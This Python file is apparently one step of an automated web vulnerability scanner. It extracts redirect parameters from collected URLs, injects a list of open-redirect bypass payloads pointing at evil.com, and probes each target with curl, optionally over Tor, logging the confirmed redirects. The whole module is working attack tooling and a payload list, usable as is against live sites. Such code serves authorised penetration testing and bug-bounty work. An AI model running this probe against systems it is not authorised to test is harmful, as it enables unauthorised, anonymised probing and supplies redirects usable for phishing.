#!/usr/bin/env python3
# modules/step12_redirect.py
import os
from core.utils import count_lines

class RedirectStep:
    def __init__(self, p): self.p=p; self.log=p.log; self.f=p.files

    def run(self):
        urls     = self.f["urls"]
        redir_params = "/tmp/m7_redir_params.txt"
        redir_out    = self.f["redirect_results"]

        self.p.shell(f"cat {urls} 2>/dev/null | gf redirect > {redir_params} 2>/dev/null",
                     label="gf redirect")

        if count_lines(redir_params) == 0:
            self.log.warn("No redirect params"); return

        REDIRECT_PAYLOADS = [
            "https://evil.com",
            "//evil.com",
            "/\\evil.com",
            "https:evil.com",
            "/%09/evil.com",
            "https://evil%E3%80%82com",
            "https://evil。com",
        ]
        pl_file = "/tmp/m7_redir_pl.txt"
        with open(pl_file,"w") as f:
            f.write("\n".join(REDIRECT_PAYLOADS)+"\n")

        self.p.shell(
            f"cat {redir_params} | head -100 | while IFS= read -r u; do "
            f"  while IFS= read -r pl; do "
            f"    mod=$(echo \"$u\" | sed \"s|=http[^&]*|=$pl|g; s|=//[^&]*|=$pl|g\"); "
            f"    loc=$(curl -sk -o /dev/null -w '%{{redirect_url}}' "
            f"          --connect-timeout 5 \"$mod\"); "
            f"    echo \"$loc\" | grep -qi 'evil.com' && "
            f"      echo \"OPEN_REDIRECT: $mod → $loc\" >> {redir_out}; "
            f"  done < {pl_file}; "
            f"done",
            label="open redirect probe", use_tor=bool(self.p.tor))

        n = count_lines(redir_out)
        if n>0:
            self.p.add_finding("medium","OPEN_REDIRECT",redir_out,f"{n} confirmed redirects","curl")
        self.log.success(f"Redirects: {n}")
